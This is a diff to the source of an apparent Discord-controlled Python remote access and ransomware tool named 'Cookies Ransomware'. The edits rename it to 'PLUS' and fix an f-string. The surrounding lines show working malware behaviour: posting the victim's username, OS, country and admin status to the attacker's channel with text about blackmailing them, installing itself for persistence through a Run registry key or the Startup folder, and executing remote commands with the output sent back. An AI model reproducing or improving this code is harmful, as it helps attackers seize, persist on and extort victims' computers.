@@ -218,7 +218,7 @@ async def on_ready():
     channel = client.get_channel(channel_.id)
     is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
     #value1 = f"@here :white_check_mark: New session opened {channel_name} | {platform.system()} {platform.release()} |  :flag_{flag.lower()}: | User : {os.getlogin()}"
-    value1 = f"@everyone ✅ **{channel_name}** | {platform.system()} {platform.release()} | :flag_{flag.lower()}: \n> Some dumbass named **`{os.getlogin()}`** ran Cookies Ransomware tool start blackmailing them!"
+    value1 = f"@everyone ✅ **{channel_name}** | {platform.system()} {platform.release()} | :flag_{flag.lower()}: \n> Some dumbass named **`{os.getlogin()}`** ran Cookies Ransomware PLUS tool start blackmailing them!"
     if is_admin == True:
         await channel.send(f'{value1} | admin!')
     elif is_admin == False:
@@ -266,7 +266,7 @@ async def on_message(message):
     
                 winreg.SetValueEx(open_,reg_name,0,winreg.REG_SZ, shutil.copy(sys.argv[0], os.getenv("appdata")+os.sep+os.path.basename(sys.argv[0])))
                 open_.Close()
-                await message.channel.send("Successfully added Ransomware tool to `run` startup")
+                await message.channel.send("Successfully added Ransomware PLUS tool to `run` startup")
             except PermissionError:
                 shutil.copy(sys.argv[0], os.getenv("appdata")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"+os.path.basename(sys.argv[0]))
                 await message.channel.send("Permission was denied, added Ransomware to `startup folder` instead")
@@ -472,7 +472,7 @@ async def on_message(message):
                     dele = "del" + temp + r"\output.txt"
                     os.popen(dele)
                 else:
-                    await message.channel.send("Command successfully executed : ```{result}``` ")
+                    await message.channel.send(f"Command successfully executed : ```{result}``` ")
             else:
                 await message.channel.send("Unrecognized command or no output was obtained :(")
                 status = None
